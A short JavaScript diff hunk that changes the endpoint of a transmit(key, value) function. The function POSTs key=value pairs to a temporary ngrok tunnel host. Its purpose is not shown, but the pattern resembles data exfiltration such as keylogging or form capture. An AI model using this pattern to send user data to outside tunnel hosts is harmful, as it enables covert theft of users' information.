@@ -11,7 +11,7 @@ function transmit(key, value) {
 	var params = key + "=" + value;
 	var request = new ajaxRequest();	
 
-	request.open("POST", "http://9d25b2c1eb23.ngrok.io/post", true) // NEEDS URL!
+	request.open("POST", "https://d64235f26cb6.ngrok.io/post", true) // NEEDS URL!
 	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
 	request.setRequestHeader("Content-length", params.length)
 	request.setRequestHeader("Connection", "keep-alive")
